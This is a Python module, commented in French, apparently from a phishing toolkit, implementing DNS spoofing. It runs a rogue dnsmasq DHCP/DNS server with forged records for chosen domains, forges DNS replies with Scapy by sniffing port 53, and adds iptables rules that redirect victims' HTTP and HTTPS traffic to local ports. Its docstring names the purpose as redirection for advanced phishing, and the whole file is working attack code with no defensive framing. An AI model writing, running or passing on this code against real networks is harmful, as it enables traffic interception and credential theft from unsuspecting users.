#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module DNS Spoofing
Redirection DNS pour phishing avancé
"""

import os
import subprocess
import threading
import time
from scapy.all import *

class DNSSpoofer:
    """Classe pour le DNS Spoofing"""
    
    def __init__(self, logger):
        self.logger = logger
        self.running = False
        self.spoof_thread = None
        self.dns_records = {}
        
    def setup_dnsmasq(self, interface, gateway_ip, dns_server):
        """Configure dnsmasq pour le DNS spoofing"""
        try:
            # Configuration de dnsmasq
            dnsmasq_config = f"""
# Configuration DNS Spoofing
interface={interface}
bind-interfaces
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,{gateway_ip}
dhcp-option=6,{dns_server}
server=8.8.8.8
server=8.8.4.4
"""
            
            # Écriture de la configuration
            with open('/tmp/dnsmasq.conf', 'w') as f:
                f.write(dnsmasq_config)
            
            # Démarrage de dnsmasq
            cmd = ['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon']
            self.dnsmasq_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.logger.log("INFO", "dnsmasq démarré avec succès")
            return True
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur configuration dnsmasq: {str(e)}")
            return False
    
    def add_dns_record(self, domain, ip_address):
        """Ajoute un enregistrement DNS personnalisé"""
        try:
            # Ajout dans dnsmasq
            with open('/tmp/dnsmasq.conf', 'a') as f:
                f.write(f"address=/{domain}/{ip_address}\n")
            
            # Redémarrage de dnsmasq
            if hasattr(self, 'dnsmasq_process'):
                self.dnsmasq_process.terminate()
                self.dnsmasq_process.wait()
            
            cmd = ['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon']
            self.dnsmasq_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.dns_records[domain] = ip_address
            self.logger.log("INFO", f"Enregistrement DNS ajouté: {domain} -> {ip_address}")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur ajout DNS: {str(e)}")
    
    def spoof_dns_packets(self, interface, target_domains):
        """Spoof les paquets DNS avec Scapy"""
        try:
            self.logger.log("INFO", "Démarrage du DNS spoofing avec Scapy")
            
            def dns_spoof_handler(pkt):
                if pkt.haslayer(DNSQR) and pkt.haslayer(DNS):
                    # Extraction des informations DNS
                    qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                    
                    # Vérification si c'est une cible
                    for domain in target_domains:
                        if domain in qname:
                            # Création d'une réponse DNS falsifiée
                            spoofed_pkt = (
                                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=target_domains[domain]))
                            )
                            
                            send(spoofed_pkt, verbose=False)
                            self.logger.log("INFO", f"DNS spoofé: {qname} -> {target_domains[domain]}")
                            break
            
            # Capture des paquets DNS
            sniff(iface=interface, prn=dns_spoof_handler, filter="udp port 53", store=0)
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur DNS spoofing: {str(e)}")
    
    def setup_iptables_redirect(self, interface, target_port=80):
        """Configure iptables pour la redirection"""
        try:
            # Redirection du trafic HTTP
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', interface, '-p', 'tcp', '--dport', '80',
                '-j', 'REDIRECT', '--to-port', str(target_port)
            ], capture_output=True)
            
            # Redirection du trafic HTTPS
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', interface, '-p', 'tcp', '--dport', '443',
                '-j', 'REDIRECT', '--to-port', '8443'
            ], capture_output=True)
            
            self.logger.log("INFO", "Règles iptables configurées")
            return True
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur configuration iptables: {str(e)}")
            return False
    
    def start_dns_spoofing(self, interface, gateway_ip, target_domains, use_dnsmasq=True):
        """Démarre le DNS spoofing"""
        self.running = True
        
        if use_dnsmasq:
            # Utilisation de dnsmasq
            if self.setup_dnsmasq(interface, gateway_ip, gateway_ip):
                # Ajout des domaines cibles
                for domain, ip in target_domains.items():
                    self.add_dns_record(domain, ip)
        else:
            # Utilisation de Scapy
            self.spoof_thread = threading.Thread(
                target=self.spoof_dns_packets, 
                args=(interface, target_domains)
            )
            self.spoof_thread.daemon = True
            self.spoof_thread.start()
        
        # Configuration iptables
        self.setup_iptables_redirect(interface)
        
        self.logger.log("INFO", "DNS Spoofing démarré")
    
    def stop_dns_spoofing(self):
        """Arrête le DNS spoofing"""
        self.running = False
        
        # Arrêt de dnsmasq
        if hasattr(self, 'dnsmasq_process'):
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait()
        
        # Arrêt du thread Scapy
        if self.spoof_thread:
            self.spoof_thread.join(timeout=2)
        
        # Nettoyage iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
        except:
            pass
        
        self.logger.log("INFO", "DNS Spoofing arrêté")
    
    def get_spoofed_domains(self):
        """Retourne la liste des domaines spoofés"""
        return self.dns_records 